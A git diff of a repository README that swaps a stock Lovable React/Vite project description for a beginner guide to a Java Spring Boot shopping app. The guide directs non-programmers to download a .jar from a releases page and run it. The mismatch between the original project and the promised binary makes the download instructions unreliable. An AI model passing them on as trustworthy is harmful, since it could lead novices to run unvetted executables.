@@ -1,73 +1,217 @@
-# Welcome to your Lovable project
+# 🛒 spring-boot-shopping-web - Simple Online Shopping Experience
 
-## Project info
+[![Download Now](https://img.shields.io/badge/Download-spring--boot--shopping--web-blue?style=for-the-badge)](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/releases)
 
-**URL**: https://lovable.dev/projects/97943cdd-c686-4c19-a21c-1e13ab791dea
+---
 
-## How can I edit this code?
+## 📦 What is spring-boot-shopping-web?
 
-There are several ways of editing your application.
+spring-boot-shopping-web is a web app designed to help you shop online easily. It works like many online stores: you can browse products, add them to your cart, log in to your account, and manage your orders. This app also supports admin features, like adding or removing products.
 
-**Use Lovable**
+It uses popular technologies like Spring Boot for the backend and Thymeleaf for the web pages. The app handles login securely and keeps your shopping cart saved while you browse. It also uses a MySQL database to store product and user information.
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/97943cdd-c686-4c19-a21c-1e13ab791dea) and start prompting.
+Even if you do not know anything about coding, this guide will help you set up and run this app on your computer.
 
-Changes made via Lovable will be committed automatically to this repo.
+---
 
-**Use your preferred IDE**
+## 🖥️ System Requirements
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+Before you begin, make sure your computer meets these requirements:
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
+- **Java:** Java Development Kit (JDK) 11 or newer installed.
+- **Database:** MySQL server version 5.7 or higher installed and running.
+- **Internet:** A stable internet connection to download the app and related files.
+- **Disk Space:** At least 500 MB free space for the app and database.
+
+If you don’t have Java or MySQL installed, you can download them for free:
+
+- Java: https://adoptium.net/
+- MySQL: https://dev.mysql.com/downloads/mysql/
+
+---
+
+## 🚀 Getting Started
+
+This section guides you to download, install, and start using the app step-by-step.
+
+---
+
+## ⬇️ Download & Install
+
+To get the app files, please visit the release page on GitHub by clicking the large badge above or the link below:
+
+**[Download spring-boot-shopping-web releases](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/releases)**
+
+On this page, look for the latest release version. Inside the release, download the `.jar` file. This file contains the app ready to run.
+
+**Steps to download:**
+
+1. Click the link above or the badge at the top to open the release page.
+2. Find the latest release; the releases have dates and version numbers.
+3. Under “Assets”, click the file ending with `.jar` to download it to your computer.
+4. Save it to a folder you can easily access, like your Desktop or Downloads folder.
+
+---
+
+## 🛠️ Setting Up the Database
+
+spring-boot-shopping-web stores data in a MySQL database. You need to create a database and set up a user account to connect the app.
 
 Follow these steps:
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+1. Open your MySQL program or the command line interface.
+2. Log in with your MySQL admin user.
+3. Create a new database for the app with this command:
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+   ```sql
+   CREATE DATABASE shoppingdb;
+   ```
 
-# Step 3: Install the necessary dependencies.
-npm i
+4. Create a new MySQL user and give it access to this database:
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+   ```sql
+   CREATE USER 'shopuser'@'localhost' IDENTIFIED BY 'yourpassword';
+   GRANT ALL PRIVILEGES ON shoppingdb.* TO 'shopuser'@'localhost';
+   FLUSH PRIVILEGES;
+   ```
 
-**Edit a file directly in GitHub**
+5. Replace `yourpassword` with a password you will remember.
+6. Keep note of the database name (`shoppingdb`), username (`shopuser`), and password for later.
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+---
 
-**Use GitHub Codespaces**
+## ⚙️ Configuring the Application
 
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
+Before running the app, update the database settings so the app can connect.
 
-## What technologies are used for this project?
+1. Find the `application.properties` file inside the `.jar` file or alongside it if provided separately.
+2. Open `application.properties` with a text editor like Notepad or VSCode.
+3. Look for these lines and update with your database info:
 
-This project is built with:
+   ```
+   spring.datasource.url=jdbc:mysql://localhost:3306/shoppingdb
+   spring.datasource.username=shopuser
+   spring.datasource.password=yourpassword
+   ```
 
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
+4. Save the file after editing.
 
-## How can I deploy this project?
+If you downloaded the app without a separate config file, the default settings may already match the above. Otherwise, you might need to create this file in the same folder as the `.jar`.
 
-Simply open [Lovable](https://lovable.dev/projects/97943cdd-c686-4c19-a21c-1e13ab791dea) and click on Share -> Publish.
+---
 
-## Can I connect a custom domain to my Lovable project?
+## ▶️ Running the Application
 
-Yes, you can!
+To start the app, follow these simple steps:
 
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
+1. Open a terminal or command prompt.
+   - On Windows, search for "Command Prompt" or "PowerShell."
+   - On macOS/Linux, open the Terminal app.
+2. Navigate to the folder where you saved the `.jar` file.
+   - For example, if it’s on your Desktop, type:
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+     ```
+     cd Desktop
+     ```
+
+3. Run this command to start the app:
+
+   ```
+   java -jar spring-boot-shopping-web.jar
+   ```
+
+   Replace `spring-boot-shopping-web.jar` with the exact name of the file you downloaded.
+
+4. Wait a moment. You will see messages showing the app is starting up.
+5. When you see a message like `Started Application in X seconds`, it means the app is ready.
+
+---
+
+## 🌐 Accessing the Web App
+
+Once the app is running, use any web browser (Chrome, Firefox, Edge, Safari) to open the app:
+
+1. Open your browser.
+2. Go to this URL:
+
+   ```
+   http://localhost:8080/
+   ```
+
+3. The app’s homepage will load. You can browse products, create an account, and start shopping.
+
+---
+
+## 🔐 User Features Overview
+
+spring-boot-shopping-web includes these user functions:
+
+- **User Registration and Login:** Create an account with an email and password. Login to save your shopping cart and view your orders.
+- **Product Browsing:** View products by category and search for specific items.
+- **Shopping Cart:** Add items to your cart and update quantities before checkout.
+- **Order Management:** Place orders and view past purchases in your profile.
+- **Secure Sessions:** Your data and login details are protected using security features.
+
+---
+
+## 🛎️ Admin Features
+
+If you want to manage products, the app has an admin section:
+
+- **Add New Products:** Include product name, description, price, and images.
+- **Edit Existing Products:** Update details or prices.
+- **Delete Products:** Remove items from the store.
+
+To access admin features, you will need special access rights configured during setup. Typically, this means creating an admin user in the database.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you run into problems, check these common issues:
+
+- **App won’t start:** Make sure Java 11 or higher is installed and the `.jar` file name is correct.
+- **Database connection errors:** Double-check your database name, username, and password in the `application.properties` file.
+- **Port conflicts:** The app uses port 8080 by default. If another app uses this port, change it in the config or stop the other app.
+- **Browser can’t load page:** Confirm the app is running and you are entering `http://localhost:8080/` in your browser’s address bar.
+
+---
+
+## 🔗 Helpful Resources
+
+- [Java Installation Guide](https://adoptium.net/)
+- [MySQL Installation and Setup](https://dev.mysql.com/doc/)
+- [Basic Command Line Usage](https://www.codecademy.com/articles/command-line-commands)
+- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
+
+---
+
+## 📂 Topics and Keywords
+
+This project covers:
+
+`ecommerce`, `full-stack`, `java`, `mysql`, `shopping-cart`, `spring-boot`, `spring-security`, `thymeleaf`, `web-application-security`
+
+These keywords might help if you look for tutorials or troubleshooting tips online.
+
+---
+
+## 🏷 License
+
+Check the repository for license details if you plan to modify or share the app.
+
+---
+
+## ⚙️ Updating the App
+
+To update to a newer version in the future:
+
+1. Visit the release page again.
+2. Download the new `.jar` file.
+3. Replace the old file with the new one in your folder.
+4. Restart the application.
+
+---
+
+spring-boot-shopping-web gives you a ready-to-use online store on your computer. Follow each step carefully to install and run it. If you need help, look at the troubleshooting tips or resources section.
